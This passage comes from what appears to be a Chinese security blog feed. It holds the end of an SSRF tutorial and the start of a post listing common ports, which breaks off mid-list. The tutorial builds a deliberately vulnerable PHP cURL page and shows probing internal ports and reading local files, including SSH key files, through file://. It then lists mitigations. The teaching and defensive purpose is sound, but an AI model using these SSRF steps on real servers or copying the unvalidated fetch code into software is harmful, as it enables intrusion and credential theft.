class="hljs-string">&#x27;txt&#x27;</span>;<br><span class="hljs-variable">$curlobj</span> = curl_init(<span class="hljs-variable">$link</span>);<br><span class="hljs-variable">$fp</span> = fopen(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;w&quot;</span>);<br>curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_FILE, <span class="hljs-variable">$fp</span>);<br>curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_exec(<span class="hljs-variable">$curlobj</span>);<br>curl_close(<span class="hljs-variable">$curlobj</span>);<br>fclose(<span class="hljs-variable">$fp</span>);<br><span class="hljs-variable">$fp</span> = fopen(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;r&quot;</span>);<br><span class="hljs-variable">$result</span> = fread(<span class="hljs-variable">$fp</span>, filesize(<span class="hljs-variable">$filename</span>)); <br>fclose(<span class="hljs-variable">$fp</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>其中：</p><ul><li>curl_init — 初始化一个cURL会话</li><li>curl_setopt — 设置一个cURL传输选项。</li><li>CURLOPT_FILE — 设置输出文件的位置，值是一个资源类型，默认为STDOUT (浏览器)。</li><li>CURLOPT_HEADER — 启用时会将头文件的信息作为数据流输出。</li><li>curl_exec — 执行一个cURL会话（在初始和设置选项完成后使用）</li></ul><p>然后我们通过输入框输入想要访问的url，就会加载对应的url过来，比如我们输入百度主页：</p><p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf01.png"></p><p>就会返回：</p><p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf02.png"></p><p>至此我们环境搭建完成。</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>我们上面提到了五种利用方式，我们拿其中的几种做一次实验。</p><p>首先是端口扫描，如果我们要对内网端口进行扫描，就可以在这里输入127.0.0.1和对应端口进行尝试。</p><p>如我们想查看mysql的banner信息，我们就可以输入127.0.0.1:3306</p><p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf03.png"></p><p>就可以看到一部分信息。</p><p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf04.png"></p><p>然后是访问web应用默认文件，比如我们尝试wamp默认界面。直接输入127.0.0.1，访问wamp的默认信息，可以搜集到很多有用的信息。</p><p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf05.png"></p><p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf06.png"></p><p>最后再来尝试一下利用file协议访问本地文件，file协议具体用法是</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">file/<span class="hljs-regexp">//c</span><span class="hljs-symbol">:/abc/filename</span>.txt<br></code></pre></td></tr></table></figure><p>file后面与http不同，有三个斜杠，然后跟本地路径和文件，这里可以是任何格式的文件，虽然在网页上显示的时候会有部分无法显示。</p><p>我们尝试一个txt文件，发现可以读取。</p><p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf07.png"></p><p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf08.png"></p><p>再尝试一个存放ssh密钥的敏感目录，发现，配置文件和密钥内容其实都可以访问。</p><p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf09.png"></p><p><img src="http://oo3iot5oz.bkt.clouddn.com/ssrf/ssrf10.png"></p><h2 id="0x05-应对"><a href="#0x05-应对" class="headerlink" title="0x05 应对"></a>0x05 应对</h2><ul><li><p>1.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件,那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p></li><li><p>2.统一设置错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p></li><li><p>3.限制请求的端口仅为http常用的端口，比如，80,443,8080,8090。</p></li><li><p>4.将内网ip加入黑名单。</p></li><li><p>5.禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等。</p></li></ul><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>SSRF漏洞不如sql注入，xss，文件上传等漏洞有名，所以在很多地方疏于防范，其造成的危害不可小觑。</p><h2 id="0x07-补充"><a href="#0x07-补充" class="headerlink" title="0x07 补充"></a>0x07 补充</h2><p>php ssrf中的伪协议：</p><p>file;dict;sftp;ldap;tftp;gopher;http</p><p>Java ssrf 中的伪协议：</p><p>file;ftp;mailto;http;https;jar;netdoc;gopher</p><p>ssrf攻击负载生成工具：</p><p><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>SSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常用端口笔记</title>
    <link href="/2018/04/23/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E7%AC%94%E8%AE%B0/"/>
    <url>/2018/04/23/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>熟知常用端口作用和容易引发的问题是网络安全中重要的一部分，这里记录一下常见端口的作用，用作笔记。</p><h2 id="0x01-各端口作用"><a href="#0x01-各端口作用" class="headerlink" title="0x01 各端口作用"></a>0x01 各端口作用</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">2</span><span class="hljs-string">端口：管理实用程序</span><br><span class="hljs-number">3</span><span class="hljs-string">端口：压缩进程</span><br><span class="hljs-number">5</span><span class="hljs-string">端口：远程作业登录</span><br><span class="hljs-number">7</span><span class="hljs-string">端口：回显</span><br><span class="hljs-number">9</span><span class="hljs-string">端口：丢弃</span><br><span class="hljs-number">11</span><span class="hljs-string">端口：在线用户</span><br><span class="hljs-number">13</span><span class="hljs-string">端口：时间</span><br><span class="hljs-number">17</span><span class="hljs-string">端口：每日引用</span><br><span class="hljs-number">18</span><span class="hljs-string">端口：消息发送协议</span><br><span class="hljs-number">19</span><span class="hljs-string">端口：字符发生器</span><br><span class="hljs-number">20</span><span class="hljs-string">端口：FTP文件传输协议(默认数据口)</span><br><span class="hljs-number">21</span><span class="hljs-string">端口：FTP文件传输协议(控制)</span><br><span class="hljs-number">22</span><span class="hljs-string">端口：SSH远程登录协议</span><br><span class="hljs-number">23</span><span class="hljs-string">端口：telnet(终端仿真协议),木马Tiny</span> <span class="hljs-string">Telnet</span> <span class="hljs-string">Server开放此端口</span><br><span class="hljs-number">24</span><span class="hljs-string">端口：预留给个人用邮件系统</span><br><span class="hljs-number">25</span><span class="hljs-string">端口：SMTP服务器所开放的端口，用于发送邮件</span><br><span class="hljs-number">27</span><span class="hljs-string">端口：NSW</span> <span class="hljs-string">用户系统</span> <span class="hljs-string">FE</span><br><span class="hljs-number">29</span><span class="hljs-string">端口：MSG</span> <span class="hljs-string">ICP</span><br><span class="hljs-number">31</span><span class="hljs-string">端口：MSG验证,木马Master</span> <span class="hljs-string">Paradise、HackersParadise开放此端口</span><br><span class="hljs-number">33</span><span class="hljs-string">端口：显示支持协议</span><br><span class="hljs-number">35</span><span class="hljs-string">端口：预留给个人打印机服务</span><br><span class="hljs-number">37</span><span class="hljs-string">端口：时间</span><br><span class="hljs-number">38</span><span class="hljs-string">端口：路由访问协议</span><br><span class="hljs-number">39</span><span class="hljs-string">端口：资源定位协议</span><br><span class="hljs-number">41</span><span class="hljs-string">端口：图形</span><br><span class="hljs-number">42</span><span class="hljs-string">端口：主机名服务</span><br><span class="hljs-number">43</span><span class="hljs-string">端口：who</span> <span class="hljs-string">is服务</span><br><span class="hljs-number">44</span><span class="hljs-string">端口：MPM(消息处理模块)标志协议</span><br><span class="hljs-number">45</span><span class="hljs-string">端口：消息处理模块</span><br><span class="hljs-number">46</span><span class="hljs-string">端口：消息处理模块(默认发送口)</span><br><span class="hljs-number">47</span><span class="hljs-string">端口：NI</span> <span class="hljs-string">FTP</span><br><span class="hljs-number">48</span><span class="hljs-string">端口：数码音频后台服务</span><br><span class="hljs-number">49</span><span class="hljs-string">端口：TACACS登录主机协议</span><br><span class="hljs-number">50</span><span class="hljs-string">端口：远程邮件检查协议</span><br><span class="hljs-number">51</span><span class="hljs-string">端口：IMP(接口信息处理机)逻辑地址维护</span><br><span class="hljs-number">52</span><span class="hljs-string">端口：施乐网络服务系统时间协议</span><br><span class="hljs-number">53</span><span class="hljs-string">端口：dns域名服务器</span><br><span class="hljs-number">54</span><span class="hljs-string">端口：施乐网络服务系统票据交换</span><br><span class="hljs-number">55</span><span class="hljs-string">端口：ISI图形语言</span><br><span class="hljs-number">56</span><span class="hljs-string">端口：施乐网络服务系统验证</span><br><span class="hljs-number">57</span><span class="hljs-string">端口：预留个人用终端访问</span><br><span class="hljs-number">58</span><span class="hljs-string">端口：施乐网络服务系统邮件</span><br><span class="hljs-number">59</span><span class="hljs-string">端口：预留个人文件服务</span><br><span class="hljs-number">60</span><span class="hljs-string">端口：未定义</span><br><span class="hljs-number">61</span><span class="hljs-string">端口：NI邮件</span><br><span class="hljs-number">62</span><span class="hljs-string">端口：异步通讯适配器服务</span><br><span class="hljs-number">63</span><span class="hljs-string">端口：whois++</span><br><span class="hljs-number">64</span><span class="hljs-string">端口：通讯接口</span><br><span class="hljs-number">65</span><span class="hljs-string">端口：TACACS数据库服务</span><br><span class="hljs-number">66</span><span class="hljs-string">端口：Oracle</span> <span class="hljs-string">SQL*NET</span><br><span class="hljs-number">67</span><span class="hljs-string">端口：引导程序协议服务端</span><br><span class="hljs-number">68</span><span class="hljs-string">端口：引导程序协议客户端</span><br><span class="hljs-number">69</span><span class="hljs-string">端口：小型文件传输协议</span><br><span class="hljs-number">70</span><span class="hljs-string">端口：信息检索协议</span><br><span class="hljs-number">71</span><span class="hljs-string">端口：远程作业服务</span><br><span class="hljs-number">72</span><span class="hljs-string">端口：远程作业服务</span><br><span class="hljs-number">73</span><span class="hljs-string">端口：远程作业服务</span><br><span class="hljs-number">74</span><span class="hljs-string">端口：远程作业服务</span><br><span class="hljs-number">75</span><span class="hljs-string">端口：预留给个人拨出服务</span><br><span class="hljs-number">76</span><span class="hljs-string">端口：分布式外部对象存储</span><br><span class="hljs-number">77</span><span class="hljs-string">端口：预留给个人远程作业输入服务</span><br><span class="hljs-number">78</span><span class="hljs-string">端口：修正TCP</span><br><span class="hljs-number">79</span><span class="hljs-string">端口：查询远程主机在线用户等信息</span><br><span class="hljs-number">80</span><span class="hljs-string">端口：http,用于网页浏览,木马Executor开放此端口</span><br><span class="hljs-number">81</span><span class="hljs-string">端口：HOST2名称服务</span><br><span class="hljs-number">82</span><span class="hljs-string">端口：传输实用程序</span><br><span class="hljs-number">83</span><span class="hljs-string">端口：模块化智能终端ML设备</span><br><span class="hljs-number">84</span><span class="hljs-string">端口：公用追踪设备</span><br><span class="hljs-number">85</span><span class="hljs-string">端口：模块化智能终端ML设备</span><br><span class="hljs-number">86</span><span class="hljs-string">端口：Micro</span> <span class="hljs-string">Focus</span> <span class="hljs-string">Cobol编程语言</span><br><span class="hljs-number">87</span><span class="hljs-string">端口：预留给个人终端连接</span><br><span class="hljs-number">88</span><span class="hljs-string">端口：Kerberros安全认证系统</span><br><span class="hljs-number">89</span><span class="hljs-string">端口：SU/MIT</span> <span class="hljs-string">telnet(终端仿真网关)</span><br><span class="hljs-number">90</span><span class="hljs-string">端口：DNSIX</span> <span class="hljs-string">安全属性标记图</span><br><span class="hljs-number">91</span><span class="hljs-string">端口：MIT</span> <span class="hljs-string">Dover假脱机</span><br><span class="hljs-number">92</span><span class="hljs-string">端口：网络打印协议</span><br><span class="hljs-number">93</span><span class="hljs-string">端口：设备控制协议</span><br><span class="hljs-number">94</span><span class="hljs-string">端口：Tivoli对象调度</span><br><span class="hljs-number">96</span><span class="hljs-string">端口：DIXIE协议规范</span><br><span class="hljs-number">97</span><span class="hljs-string">端口：快速远程虚拟文件协议</span><br><span class="hljs-number">98</span><span class="hljs-string">端口：TAC新闻协议</span><br><span class="hljs-number">99</span><span class="hljs-string">端口：后门程序ncx99开放此端口</span><br><span class="hljs-number">100</span><span class="hljs-string">端口：未知用途</span><br><span class="hljs-number">101</span><span class="hljs-string">端口：NIC</span> <span class="hljs-string">主机名称服务</span><br><span class="hljs-number">102</span><span class="hljs-string">端口：消息传输代理</span><br><span class="hljs-number">103</span><span class="hljs-string">端口：Genesis</span> <span class="hljs-string">点对点传输网络</span><br><span class="hljs-number">105</span><span class="hljs-string">端口：信箱名称服务</span><br><span class="hljs-number">106</span><span class="hljs-string">端口：3COM-TSMUX开放端口</span><br><span class="hljs-number">107</span><span class="hljs-string">端口：远程Telnet服务</span><br><span class="hljs-number">108</span><span class="hljs-string">端口：SNA</span> <span class="hljs-string">网关访问服务</span><br><span class="hljs-number">109</span><span class="hljs-string">端口：POP2服务器开放此端口,用于接收邮件</span><br><span class="hljs-number">110</span><span 